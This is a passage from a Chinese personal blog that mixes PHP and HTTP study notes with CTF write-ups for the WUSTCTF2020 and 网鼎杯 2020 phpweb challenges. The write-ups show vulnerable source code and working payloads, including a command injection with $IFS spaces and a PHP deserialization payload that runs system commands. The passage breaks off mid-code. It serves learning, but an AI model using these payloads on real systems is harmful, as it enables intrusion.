class="string">&#x27;YYYYmmdd&#x27;</span>);</span><br><span class="line">		<span class="comment">//产生随机字符串</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">4</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">			<span class="variable">$fullname</span> .= chr(mt_rand(<span class="number">65</span>,<span class="number">90</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//拼凑后缀</span></span><br><span class="line">		<span class="variable">$fullname</span> .= <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//移动到指定目录</span></span><br><span class="line">		<span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="comment">//文件不是上传的</span></span><br><span class="line">			<span class="variable">$error</span> = <span class="string">&#x27;错误：不是上传文件！&#x27;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$fullname</span>))&#123;</span><br><span class="line">			<span class="comment">//成功</span></span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$fullname</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">//移动失败</span></span><br><span class="line">			<span class="variable">$error</span> = <span class="string">&#x27;文件上传失败！&#x27;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>



<h1 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h1><p>HTTP协议</p>
<p>HTTP协议初步认识</p>
<p>HTTP协议概念</p>
<p>HTTP协议，即超文本传输协议(Hypertext transfer protocol)。是一种详细规定了浏览器和万维网(WWW = World Wide Web)服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。</p>
<p>HTTP协议是用于从WWW服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。</p>
<p>HTTP协议特点</p>
<p>1） 客户/服务器模式：客户端（浏览器）/服务端</p>
<p>2） 简单快速：客户向服务器请求服务时，只需传送请求方法和路径。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</p>
<p>3） 灵活：HTTP允许传输任意类型的数据对象（MIME类型）</p>
<p>4）无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</p>
<p>5）无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p>
<p>HTTP协议分类</p>
<p>1）http请求协议：浏览器向服务器发起请求的时候需要遵循的协议</p>
<p>2）http响应协议：服务器向浏览器发起响应的时候需要遵循的协议</p>
<p>请求行</p>
<p>1） 形式：请求方式 资源路径  协议版本号</p>
<p>2） GET /index.php HTTP/1.1</p>
<p>最早的时候HTTP协议有过1.0，请求行独占一行（第一行）</p>
<p>请求头</p>
<p>请求头就是各项协议内容：具体的协议内容不会每次都使用全部</p>
<p>1）Host：请求的主机地址（必须）</p>
<p>2）Accept：当前请求能够接收服务器返回的类型（MIME类型）</p>
<p>3）Accept-Language：接收的语言</p>
<p>4）User-Agent：客户浏览器所在点的一些信息</p>
<p>请求头不固定数量，每个请求协议也是独占一行，最后会有一行空行（用来区分请求头和请求体）</p>
<p>请求体</p>
<p>请求数据：POST请求会有请求体。GET请求所有的数据都是跟在URL之后，会在请求行中的资源路径上体现。</p>
<p>基本格式：资源名字=资源值&amp;资源名字=资源值…</p>
<p>​                               </p>
<p>HTTP响应</p>
<p>响应行</p>
<p>1）形式：协议版本号 状态码 状态消息（独占一行）</p>
<p>HTTP/1.1 200 ok</p>
<p>2）200 ok： 成功</p>
<p>3）403 Forbidden： 没权限访问</p>
<p>4）404 Not Found： 未找到页面</p>
<p>5）500 Server Internal Error： 服务器内部错误</p>
<p>响应头</p>
<p>具体协议内容</p>
<p>1）时间：Wed, 16 Sep 2017 11:43:33 GMT</p>
<p>2）服务器：Server: Apache/2.2.22 (Win32) PHP/5.3.13</p>
<p>3）内容长度：Content-Length: 1571，数据具体的字节数（响应体）</p>
<p>4）内容类型：Content-Type: text/html：告诉浏览器对应的数据格式</p>
<p>列举了几个常见的响应头，并不是全部：响应头一个占一行，最后一行空行（区分响应头和响应体）</p>
<p>响应体</p>
<p>实际服务器响应给浏览器的内容</p>
<p>常用HTTP状态码</p>
<p>状态码200：成功</p>
<p>状态码403：forbidden，拒绝访问（没有权限）</p>
<p>状态码404：NOT FOUND，找不到</p>
<p>状态码500：服务器问题</p>
<p>服务器正在处理过程中</p>
<p>服务器正常且正确处理</p>
<p>请求的目标已经转移或者需要更新</p>
<p>客户端出错了</p>
<p>服务器出错</p>
<p>HTTP响应</p>
<p>常见HTTP响应设置及使用</p>
<p>PHP中针对HTTP协议（响应）进行了底层设计，可以通过函数header来实现修改HTTP响应（响应头）</p>
<p>注意事项：</p>
<p>1、 Header可以设计HTTP响应，因为HTTP协议特点是：响应行，响应头（空行结尾），响应体。认为通过header设计响应头的时候，不应该有任何内容输出，所以一旦产生内容输出（哪怕一个空格），系统都会认为响应头已经结束而响应体开始了，所有如果先输出内容后设置响应头（header使用），理论设置无效；</p>
<p>2、 在PHP5以后，增加程序缓存内容：允许服务器脚本在输出内容的时候，不直接返回浏览器而是现在服务器端使用程序缓存保留（php.ini中使用output_buffering），有了该内容之后，在程序缓存内会自动调整响应头和响应体（允许响应头在已经输出的内容之后再设置），但是此时会报错（警告）。</p>
<p>总结：header设置响应体之前不要有任何输出</p>
<p>Location：重定向，立即跳转（响应体不用解析）</p>
<p>浏览器在解析服务器响应的时候：先判定响应行，继续响应头，最后响应体：location是在响应头中，所以浏览器一旦见到该协议项，不再向下解析。</p>
<p>Refresh：重定向，定时跳转（响应体会解析）</p>
<p>延时重定向：浏览器会根据具体时间延迟后在访问指定跳转链接：浏览器在准备跳转访问之前，会继续解析HTTP协议（响应头和响应体）</p>
<p>Content-type：内容类型，MIME类型</p>
<p>通过内容告知（MIME类型），浏览器正确解析内容</p>
<p>Content-disposition：内容类型，MIME类型扩展，激活浏览器文件下载对话框</p>
<p>浏览器在解析内容的时候，默认是直接解析：那么有时候需要浏览器不解析，当做内容下载成文件</p>
<h2 id="PHP模拟HTTP请求"><a href="#PHP模拟HTTP请求" class="headerlink" title="PHP模拟HTTP请求"></a>PHP模拟HTTP请求</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>PHP可以通过模拟HTTP协议发起HTTP请求</p>
<p>CURL是一个非常强大的开源库，支持很多协议，包括HTTP、FTP、TELNET等，我们使用它来发送HTTP请求。它给我 们带来的好处是可以通过灵活的选项设置不同的HTTP协议参数，并且支持HTTPS。CURL可以根据URL前缀是“HTTP” 还是“HTTPS”自动选择是否加密发送内容。</p>
<p>前提条件：HTTP协议的客户端/服务端模式，HTTP协议不局限于一定要浏览器访问</p>
<h3 id="Curl扩展库使用"><a href="#Curl扩展库使用" class="headerlink" title="Curl扩展库使用"></a>Curl扩展库使用</h3><p>1、 开启CURL扩展</p>
<p>2、 有的时候PHP版本会出现即使开启了扩展也无法使用扩展的可能：因为CURL找不到对应的dll文件：需要将相关的DLL文件放到C:windows</p>
<p>3、 重启Apache应用</p>
<p>1）建立连接：curl_init()：激活一个CURL连接功能</p>
<p>2）设置请求选项：curl_setOpt()：设定选项</p>
<p>CURLOPT_URL：连接对象</p>
<p>CURLOPT_RETURNTRANSFER:将服务器执行的结果（响应）以文件流的形式返回给请求界面（PHP脚本）</p>
<p>CURLOPT_POST：是否才有POST方式发起请求（默认请求是GET）</p>
<p>CURLOPT_POSTFIELDS：用来传递POST提交的数据，分为两种方式：字符串（name=abc&amp;password=123）以及数组形式（array(‘name’=&gt;’abc’,…)）</p>
<p>CURLOPT_HEADER：是否得到响应的header信息（响应头），默认不获取</p>
<p>3）执行请求：curl_exec()：执行选项（与服务器发起请求），得到服务器返回的内容</p>
<p>乱码原因：20select.php中的内容有告知浏览器，但是当前是被服务器脚本23curl_http.php访问的，没有做解析；输出给浏览器之后，需要当前23curl_http.php告知浏览器对应的字符集</p>
<p>4）关闭连接：curl_close()：关闭资源</p>
<p>文件编程</p>
<p>文件编程初步认识</p>
<p>文件编程的必要性</p>
<p>文件编程指利用PHP代码针对文件（文件夹）进行增删改查操作。</p>
<p>在实际开发项目中，会有很多内容（文件上传、配置文件等）具有很多不确定性，不能在一开始就手动的创建，需要根据实际需求和数据本身来进行管理，这个时候就可以使用PHP文件编程来实现代码批量控制和其他操作。</p>
<p>文件操作的分类</p>
<p>1） 目录操作：文件夹，用来存放文件的特殊文件</p>
<p>2） 文件操作：用来存放内容</p>
<p>目录操作</p>
<p>文件操作创建目录结构</p>
<p>1）mkDir(路径名字)：创建成功返回true，创建失败返回false</p>
<p>有些操作为的就是得到一个想要的结果，如果结果本身就存在，那么可以忽略得到过程的错误：抑制错误</p>
<p>删除目录</p>
<p>1）rmDir(指定文件夹路径)：移出文件夹</p>
<p>读取目录</p>
<p>读取方式：将文件夹（路径）按照资源方式打开</p>
<p>1）openDir()：打开资源，返回一个路径资源，包含指定目录下的所有文件（文件夹）</p>
<p>2）readDir()：从资源中读取指针所在位置的文件名字，然后指针下移，直到指针移出资源</p>
<p>读取所有内容：遍历操作</p>
<p>关闭目录</p>
<p>1）closeDir()：关闭资源</p>
<p>其他目录操作</p>
<p>1）dirName(一个路径)：得到的是路径的上一层路径</p>
<p>2）realPath(一个路径)：得到真实路径（目录路径），如果是文件那么得到的结果是false</p>
<p>3）is_dir()：判断指定路径是否是一个目录</p>
<p>4）scandir()：封装版的opendir\readdir\closedir，获取一个指定路径下的所有文件信息，以数组形式返回</p>
<p>目录操作</p>
<p>递归遍历目录</p>
<p>递归遍历目录：指定一个目录的情况下，将其下的所有文件和目录，及其目录内部的所有内容都输出出来。</p>
<p>递归算法：将大问题切成相似的小问题（最小单位），然后可以调用解决大问题的方法来解决小问题。</p>
<p>递归函数：函数如果自己内部调用自己，该函数称之为递归函数。</p>
<p>递归遍历目录的思维逻辑</p>
<p>1、 设计一个能够遍历一层文件的函数</p>
<p>a.  创建函数</p>
<p>b.  安全判定：是路径才访问</p>
<p>c.   读取全部内容，遍历输出</p>
<p>2、 找到递归点：遍历得到的文件是目录，应该调用当前函数（调用自己）：</p>
<p>a.  需要构造路径（遍历得到的结果只是文件的名字）</p>
<p>b.  需要注意排除.和..</p>
<p>c.   判断是路径还是文件</p>
<p>d.  递归调用函数</p>
<p>3、 找到递归出口：遍历完这个文件夹之后，发现没有任何子文件夹（函数不再调用自己）：自带递归出口</p>
<p>4、 如何显示层级关系？函数第一次运行遍历的结果是最外层目录，内部调用一次说明进入一个子目录，子目录再调用一次函数进行孙子目录…如果能够在第一次调用的时候给个标记，然后在进入的时候，通过标记的变化来识别层级关系，就可以达到目的：该标记还能代表层次关系：缩进</p>
<p>a.  在函数参数中增加一个标记：默认值为0</p>
<p>b.  递归调用函数的时候也需要使用该参数：但是是属于当前层级的子层，所以+1</p>
<p>c.   根据层级来实现缩进：str_repeat()</p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="PHP5常见文件操作函数"><a href="#PHP5常见文件操作函数" class="headerlink" title="PHP5常见文件操作函数"></a>PHP5常见文件操作函数</h3><p>1）file_get_contents(文件路径)：获取指定文件的所有内容，如果路径不存在最好做安全处理</p>
<p>2）file_put_contents(文件路径，内容)：将指定内容写入到指定文件内：如果当前路径下不存在指定的文件，函数会自动创建（如果路径不存在，不会创建路径）</p>
<h3 id="PHP4常见文件操作函数"><a href="#PHP4常见文件操作函数" class="headerlink" title="PHP4常见文件操作函数"></a>PHP4常见文件操作函数</h3><p>PHP4中是将文件操作用资源形式处理：不论是读还是写都依赖资源指针：文件内容中指针所在位置。</p>
<p>1）fopen(文件路径，打开模式)：打开一个文件资源，限定打开模式</p>
<p>2）fread(资源，长度)：从打开的资源中读取指定长度的内容（字节）</p>
<p>3）fwrite(资源，内容)：向打开的资源中写入指定的内容</p>
<p>4）fclose(资源)：关闭资源</p>
<h3 id="其他文件操作函数"><a href="#其他文件操作函数" class="headerlink" title="其他文件操作函数"></a>其他文件操作函数</h3><p>1）is_file()：判断文件是否正确（不识别路径）</p>
<p>2）filesize()：获取文件大小</p>
<p>3）file_exists()：判断文件是否存在（识别路径）</p>
<p>4）unLink()：取消文件名字与磁盘地址的连接（删除文件）</p>
<p>5）filemtime()：获取文件最后一次修改的时间</p>
<p>6）fseek()：设定fopen打开的文件的指针位置</p>
<p>7）fgetc()：一次获取一个字符</p>
<p>8）fgets()：一次获取一个字符串（默认行）</p>
<p>9）file()：读取整个文件，类似file_get_contents，区别是按行读取，返回一个数组</p>
<h2 id="文件操作-1"><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><p>文件下载：从服务器将文件通过HTTP协议传输到浏览器，浏览器不解析保存成相应的文件。</p>
<p>提供下载方式可以使用HTML中的a标签：<a href="互联网绝对文件路径">点击下载</a></p>
<p>1、 缺点1：a标签能够让浏览器自动下载的内容有限：浏览器是发现如果解析不了才会启用下载</p>
<p>2、 缺点2：a标签下载的文件存储路径会需要通过href属性写出来，这样会暴露服务器存储数据的位置（不安全）</p>
<p>PHP下载：读取文件内容，以文件流的形式传递给浏览器：在响应头中告知浏览器不要解析，激活下载框实现下载。</p>
<p>1） 指定浏览器解析字符集</p>
<p>2） 设定响应头</p>
<p>a)  设定文件返回类型：image/jpg||application/octem-stream</p>
<p>b)  设定返回文件计算方式：Accept-ranges：bytes</p>
<p>c)  设定下载提示：Content-disposition:attachment;filename=’文件名字’</p>
<p>d)  设定文件大小：Accept-length：文件大小（字节）</p>
<p>3） 读取文件</p>
<p>4） 输出文件</p>
<p>方案1：如果文件较小，可以使用PHP5的文件函数操作：file_get_contents</p>
<p>方案2：文件比较大（网络不好），可以使用PHP4 的文件操作方式：一次读一点</p>
<p> [WUSTCTF2020]朴实无华</p>
<p>看一看 扫一扫</p>
<p>…..</p>
<!--more-->

<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824164630868.png" alt="image-20210824164630868"></p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824164717241.png" alt="image-20210824164717241"></p>
<p>编码是unicode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">   $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>intval 5e10返回</p>
<blockquote>
<p>当科学计数法为字符串传入到<code>intval</code>函数中时，它将会只返回<code>e</code>前面的整数<br>如果该字符串加上1，又能够变成数字型</p>
</blockquote>
<p>md5=0e215962017</p>
<blockquote>
<p>php弱等于 0e开头后面纯数字的字符串都相等 0e开头后接数字字符串md5后还是0e开头后接数字</p>
</blockquote>
<p>先看看有啥文件 再绕过cat和空格</p>
<p><code>?num=5e10&amp;md5=0e215962017&amp;get_flag=ls</code></p>
<p> <img src="E:/sECRET/hexo/blog/source/_posts/image-20210824165715078.png" alt="image-20210824165715078"></p>
<p>血 吗长的文件  打开 </p>
<p><code>num=5e10&amp;md5=0e215962017&amp;get_flag=tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824165812453.png" alt="image-20210824165812453"></p>
<p>反思：</p>
<p>1.php不行这个事属实铸币</p>
<p>2.对于常见函数的绕过  还得多积累</p>
<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>打开是个抽象 </p>
<p>抓包一会出来个  </p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824163604448.png" alt="image-20210824163604448"></p>
<p>传参</p>
<p><code>func=system&amp;p=ls</code>失败  估计是被过滤  </p>
<p><code>func=file_get_contents&amp;p=index.php</code>查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,</span><br><span class="line">&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,</span><br><span class="line">&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;,</span><br><span class="line">&quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,</span><br><span class="line">&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, </span><br><span class="line">&quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">//黑名单列表，该列表中的所有函数都不能执行</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看到黑名单过滤一堆 </p>
<p>还存在魔法函数 有反序列化的可能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Test &#123;</span><br><span class="line">        var $p = &quot;ls&quot;;</span><br><span class="line">        var $func = &quot;system&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>传入    </p>
<p>payload:<code>func=unserialize p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824163725001.png" alt="image-20210824163725001"></p>
<p>后端接收这两个参数后，调用<code>call_user_func</code>将上面的字符串进行反序列化，还原成上面的代码。而上面的代码核心在于创建一个Test()对象，因为在_destruct()函数是构造方法，在创建对象时会执行，根据在Test类中设置的函数名和参数值再一次执行，此时即可获取我们所需的信息。</p>
<p>常用命令小结：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls&#x27;) : 列举当前目录下的所有文件</span><br><span class="line"></span><br><span class="line">system(&quot;find / -name flag*&quot;)：查找所有文件名匹配flag*的文件</span><br><span class="line"></span><br><span class="line">system(&quot;cat $(find / -name flag**)&quot;)：**打印所有文件名匹配flag*的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824164136935.png" alt="image-20210824164136935"></p>
<p>payload<code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find / -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p>
<h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p>考点：代码审计 php反序列化的对象逃逸</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span 